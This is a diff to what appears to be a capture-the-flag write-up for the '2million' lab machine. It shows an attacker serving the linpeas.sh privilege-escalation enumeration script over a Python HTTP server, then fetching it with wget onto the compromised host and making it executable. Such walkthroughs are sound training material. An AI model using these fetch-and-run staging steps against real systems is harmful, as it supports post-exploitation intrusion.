@@ -873,31 +873,30 @@ admin@2million:~$
 
 ``` bash
 
-❯ which linpeas
-/usr/bin/linpeas
-❯ cd /usr/bin/
+❯ ls
+linpeas_darwin_amd64  linpeas_fat.sh     linpeas_linux_amd64  linpeas_linux_arm64  linpeas_small.sh
+linpeas_darwin_arm64  linpeas_linux_386  linpeas_linux_arm    linpeas.sh
 ❯ python3 -m http.server 9090
 
 Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
-10.129.229.66 - - [30/Jul/2026 03:25:46] "GET /linpeas HTTP/1.1" 200 -
 
 
 ```
 
 ``` bash
 
-admin@2million:~$ wget http://10.10.15.242:9090/linpeas
---2026-07-30 01:25:33--  http://10.10.15.242:9090/linpeas
+admin@2million:~$ wget http://10.10.15.242:9090/linpeas.sh
+--2026-07-30 01:27:57--  http://10.10.15.242:9090/linpeas.sh
 Connecting to 10.10.15.242:9090... connected.
 HTTP request sent, awaiting response... 200 OK
-Length: 82 [application/octet-stream]
-Saving to: ‘linpeas’
+Length: 989760 (967K) [application/x-sh]
+Saving to: ‘linpeas.sh’
 
-linpeas                       100%[=================================================>]      82  --.-KB/s    in 0s
+linpeas.sh                    100%[=================================================>] 966.56K  3.80MB/s    in 0.2s
 
-2026-07-30 01:25:33 (10.9 MB/s) - ‘linpeas’ saved [82/82]
+2026-07-30 01:27:58 (3.80 MB/s) - ‘linpeas.sh’ saved [989760/989760]
 
-admin@2million:~$ chmod +x linpeas
+admin@2million:~$ chmod +x linpeas.sh
 admin@2million:~$
 
 ```
